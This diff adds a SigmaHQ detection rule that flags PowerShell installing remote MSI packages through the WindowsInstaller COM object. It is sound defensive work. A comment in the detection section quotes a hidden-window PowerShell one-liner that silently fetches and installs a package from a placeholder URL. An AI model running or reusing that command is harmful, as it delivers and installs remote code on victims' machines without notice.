@@ -1,0 +1,88 @@
+---
+title: PowerShell MSI Install via WindowsInstaller COM From Remote Location
+summary: |-
+  Detects the execution of PowerShell commands that attempt to install MSI packages via the
+  Windows Installer COM object (`WindowsInstaller.Installer`) hosted remotely.
+  This could be indication of malicious software deployment or lateral movement attempts using Windows Installer functionality.
+  And the usage of WindowsInstaller COM object rather than msiexec could be an attempt to bypass the detection.
+sigma_id: 222720a7-047f-4054-baa5-bab9be757db0
+status: experimental
+level: medium
+platform: windows
+logsource: windows / process_creation
+tactics:
+  - TA0002
+  - TA0011
+techniques:
+  - T1059.001
+  - T1218
+  - T1105
+author: Meroujan Antonyan (vx3r)
+date: '2025-06-05'
+falsepositives:
+  - Unknown
+references:
+  - https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
+  - https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
+  - https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
+source:
+  name: SigmaHQ
+  url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi_remote.yml
+  license: DRL-1.1
+  license_url: https://github.com/SigmaHQ/Detection-Rule-License
+format: Sigma
+---
+
+```yaml
+title: PowerShell MSI Install via WindowsInstaller COM From Remote Location
+id: 222720a7-047f-4054-baa5-bab9be757db0
+status: experimental
+description: |
+    Detects the execution of PowerShell commands that attempt to install MSI packages via the
+    Windows Installer COM object (`WindowsInstaller.Installer`) hosted remotely.
+    This could be indication of malicious software deployment or lateral movement attempts using Windows Installer functionality.
+    And the usage of WindowsInstaller COM object rather than msiexec could be an attempt to bypass the detection.
+references:
+    - https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
+    - https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
+    - https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
+author: Meroujan Antonyan (vx3r)
+date: 2025-06-05
+tags:
+    - attack.execution
+    - attack.stealth
+    - attack.t1059.001
+    - attack.t1218
+    - attack.command-and-control
+    - attack.t1105
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u),'')";
+    selection_img:
+        - Image|endswith:
+              - '\powershell_ise.exe'
+              - '\powershell.exe'
+              - '\pwsh.exe'
+        - OriginalFileName:
+              - 'PowerShell_ISE.EXE'
+              - 'PowerShell.EXE'
+              - 'pwsh.dll'
+    selection_cli:
+        CommandLine|contains|all:
+            - '-ComObject'
+            - 'InstallProduct('
+    selection_remote:
+        CommandLine|contains:
+            - 'http'
+            - '\\\\'
+    filter_main_localhost:
+        CommandLine|contains:
+            - '://127.0.0.1'
+            - '://localhost'
+    condition: all of selection_* and not 1 of filter_main_*
+falsepositives:
+    - Unknown
+level: medium
+```
